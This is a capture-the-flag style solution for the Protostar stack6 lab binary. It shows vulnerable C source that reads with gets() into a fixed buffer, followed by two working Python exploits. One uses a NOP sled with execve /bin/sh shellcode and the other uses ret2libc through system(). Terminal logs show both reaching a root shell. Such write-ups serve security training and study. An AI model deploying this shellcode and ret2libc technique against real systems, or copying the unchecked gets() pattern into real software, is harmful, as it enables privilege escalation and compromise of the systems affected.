Source:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

Aim: get the root shell

Method 1:
Here is the exploit (saved as `st6.py`):
```python
import struct
buffstart=0xbffff75c
ebpval=0xbffff7a8
padding='a'*(ebpval-buffstart)
ebpnewval=struct.pack('<I',ebpval+0xf0)
eip=struct.pack('<I',0x8048508)  # 0x80484f9 also works (or any address pointing to ret instruction)
eip2=struct.pack('<I',ebpval+0xc0)
nopslide='\x90'*1000
trap='\xcc'*4
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
# output=padding+ebpnewval+eip+eip2+nopslide+trap
output=padding+ebpnewval+eip+eip2+nopslide+shellcode
print output
```

Sample output:
```bash
user@protostar:/opt/protostar/bin$ (python ~/st6.py;cat) | ./stack6
input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�aaaaaaaa����h�������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin����°
                                                                      ̀1�@̀
whoami
root
user@protostar:/opt/protostar/bin$
```

Method 2 (ret2libc):
Hints:
- `info proc map`: shows list of mapped memory regions in running process in GDB
- `strings -a -t x <filepath>`: Gives strings with offset in hex
- `/lib/libc-2.11.2.so`: Path of libc in protostar (got using `info proc map` in GDB)
- `p system`: Useful for getting address of `system` using GDB

Here is the exploit script (saved as `st6b.py`):
```python
import struct
buffstart=0xbffff75c
ebpval=0xbffff7a8
padding='a'*(ebpval-buffstart)
ebpnewval = struct.pack('<I',ebpval+0xf0)
binshAddr = struct.pack('<I',0xb7e97000+0x11f3bf)
eip       = struct.pack('<I',0xb7ecffb0) # Address of system
retaddr_after_system='aaaa' # we don't care about this
print padding+ebpnewval+eip+retaddr_after_system+binshAddr
```

Sample output:
```bash
user@protostar:/opt/protostar/bin$ (python ~/st6b.py;cat) | ./stack6
input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa���aaaaaaaa�������aaaa�c��
whoami
root
Segmentation fault
```
